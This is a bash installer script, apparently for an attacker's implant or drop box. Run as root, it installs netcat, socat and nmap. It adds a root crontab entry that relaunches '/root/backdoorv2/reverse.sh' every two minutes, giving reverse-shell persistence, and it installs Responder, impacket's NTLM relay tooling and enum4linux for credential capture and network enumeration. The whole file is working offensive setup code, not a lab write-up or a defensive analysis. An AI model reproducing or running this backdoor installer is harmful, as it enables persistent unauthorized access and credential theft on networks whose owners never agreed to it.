#!/bin/bash
function package(){
  echo "[-] Installing packages"
  apt-get install ssh socat vim screen netcat git python-pip libffi-dev libssl-dev nmap -y 
  # Make a function to check the version and if the packages are really ok
}

function crontabCreate(){
echo '[-] Crontab function'
if [[ $(grep -i reverse /etc/crontab  | wc -l) == '0' ]];then
  echo "[+] Adding crontab to run ever 2 minutes"
  echo '*/2 * * * * root /root/backdoorv2/reverse.sh start' >> /etc/crontab
  echo '[-] Restarting crontab'
  systemctl restart cron
else
  echo '[*] Already has a crontab configuration'
fi
}

function hackingTools(){
  responder
  ntlmrelay
  enum4linux
}


function enum4linux(){
  echo "[+] Instaling enum4Linux"
  package='enum4linux-0.8.9.tar.gz'
  wget -q https://labs.portcullis.co.uk/download/$package -O /tmp/enum4linux.tar.gz
  tar -xzvf /tmp/enum4linux.tar.gz -C /opt/
  ln -s /opt/enum4linux-0.8.9/enum4linux.pl /usr/local/sbin/enum4linux 
  echo "[-] Done"
}

function ntlmrelay(){
  echo "[+] Instaling impacket for ntlmRelay"
  git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
  cd /opt/impacket
  pip install .
  echo "[-] Done"

}
function responder(){
  echo "[-] Installing Responder"
  git clone https://github.com/lgandx/Responder.git /opt/Responder
  ln -s /opt/Responder/Responder.py /usr/local/sbin/responder 
  echo "[-] Done"
}

function directories(){
  LOGPATH='/var/log/reverse'
  echo "[-] Creating log directory"
  if [  -d $LOGPATH ]
  then
    echo '[+] Log Directory already exist'
  else
    mkdir $LOGPATH
    echo '[+] Directory $LOGPATH created'
  fi
}
if [[ $(id -u) != 0 ]]
then
  echo "[+] Needs root to run"
  exit 1 
fi

package
directories
crontabCreate
hackingTools

